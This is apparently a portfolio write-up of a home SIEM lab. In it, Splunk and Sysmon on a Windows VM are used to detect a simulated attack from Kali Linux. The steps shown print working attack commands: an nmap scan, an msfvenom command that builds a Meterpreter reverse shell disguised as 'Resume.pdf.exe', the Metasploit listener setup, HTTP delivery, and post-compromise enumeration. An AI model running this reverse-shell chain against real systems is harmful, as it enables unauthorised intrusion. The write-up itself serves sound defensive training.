### SIEM-Implementation-and-Log-Analysis

### Objective
This SIEM implementation lab focused on deploying and configuring a Security Information and Event Management (SIEM) solution using Splunk on a Windows virtual machine. The goal was to monitor and detect security threats by leveraging Sysmon logs, while simulating real-world cyber attacks from a Kali Linux virtual machine using Metasploit and MSFvenom. These simulations generated security events that were analyzed to improve incident response capabilities. The hands-on project provided practical experience in using Splunk Processing Language (SPL), parsing log data, and identifying attack patterns through parent-child process relationships.

### Skills Learned
. Gained advanced understanding of SIEM concepts and their real-world application.
. Demonstrated proficiency in analyzing, interpreting, and correlating network and host-based logs.
. Developed the ability to generate and identify attack signatures and behavioral patterns.
. Strengthened knowledge of network protocols and common security vulnerabilities.
. Enhanced critical thinking and problem-solving skills in cybersecurity contexts.
. Deepened understanding of the importance of filtering and prioritizing logs using EventCodes for effective threat detection.

### Tools Used
. Splunk – Deployed as the SIEM platform for log ingestion, correlation, and security event analysis.
. Kali Linux – Used for simulating attacks, including payload generation with MSFvenom and exploitation with Metasploit.
. Telemetry Generation Tools – Employed to simulate realistic network traffic and create meaningful attack scenarios.
. Windows Logging & Monitoring – Utilized Sysmon and native event logging to collect and analyze security-relevant data, with a focus on process creation events and parent-child relationships.

### Steps
1. Screenshots of Kali Linux Attack Simulation
Below are key command-line steps executed on the Kali Linux virtual machine during the simulated cyber attack targeting the Windows environment:
Nmap Port Scan
Objective: Identify open ports on the Windows target.
Command: nmap -sS -T4 -Pn <target-ip>
Result: Discovered open TCP port 3389 (RDP) indicating a potential remote access point.
![image alt](https://github.com/waqar172/Portfolio/blob/master/01.PNG?raw=true)

2. MSFvenom Payload Generation
Objective: Create a malicious executable to simulate initial access.
Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o Resume.pdf.exe
Output: Generated a reverse shell payload disguised as a PDF file.
![image alt](https://github.com/waqar172/Portfolio/blob/master/02.PNG?raw=true)

3. Metasploit Exploit Setup
Objective: Configure the Metasploit listener to handle the reverse shell.
Commands: msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 4444
run
![image alt](https://github.com/waqar172/Portfolio/blob/master/03.PNG?raw=true)

4. Python HTTP Server for Payload Delivery
Objective: Serve the malicious file to the Windows victim machine over HTTP.
Command: python3 -m http.server 9999
![image alt](https://github.com/waqar172/Portfolio/blob/master/04.PNG?raw=true)

5. HTTP Server Webpage Hosting the Payload
Objective: Deliver the malicious executable (Resume.pdf.exe) to the target Windows machine. The file is hosted via a simple Python HTTP server on port 9999.
Command used to start the server: python3 -m http.server 9999
Description:
The screenshot displays the HTTP server’s web interface as seen from a browser, listing the malicious payload (Resume.pdf.exe) and confirming it is accessible for download by the Windows target.
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/05.PNG)

6. Evidence of Reverse Shell Connection on Windows Target
Objective: Confirm that the malicious payload (Resume.pdf.exe) executed successfully and established a reverse TCP connection from the Windows machine to the Kali Linux attacker's machine.
Screenshot 1: Established Connection via netstat
Command Run: netstat -anob
Description:
This screenshot captures the Windows command prompt output showing an active TCP connection from the Windows machine to the Kali Linux attacker's IP on port 4444. The connection is linked to PID 3588, indicating the process responsible for the communication.
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/06.PNG)
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/07.PNG)

Screenshot 2: Process Linked to Payload in Task Manager
Description:
This screenshot displays the Services tab in Task Manager, verifying that PID 3588 belongs to the malicious file Resume.pdf.exe. This confirms that the payload generated via MSFvenom is actively running and responsible for the established reverse shell connection.
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/08.PNG)
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/09.PNG)

7. Meterpreter Session Established from Kali Linux
Objective: Confirm that the Metasploit handler successfully received a reverse TCP connection from the Windows target.
Screenshot 1: Metasploit Reverse Shell Connection
Description:
This screenshot captures the Metasploit console after executing the exploit command. The terminal output shows that the handler began listening on the specified local port and successfully received a reverse TCP connection, initiating Meterpreter session 4. The connection is from the Windows target IP back to the Kali Linux attack machine.
Screenshot
![image alt](https://github.com/waqar172/Portfolio/blob/a5ef6741f46824fddb30c88ba53411f5f909d237/10.PNG)

8. Post-Exploitation Commands Executed via Meterpreter
Objective: Simulate initial attacker enumeration activities following successful compromise.
Screenshot 2: Post-Exploitation Enumeration via shell
Description:
After invoking the shell command within the Meterpreter session, the Windows Command Prompt (cmd.exe) was accessed. Several commands were executed to gather system and user information:
net user – Lists user accounts on the system.
net localgroup – Displays local user groups.
ipconfig – Shows network interface configurations and IP address assignments.
Screenshot


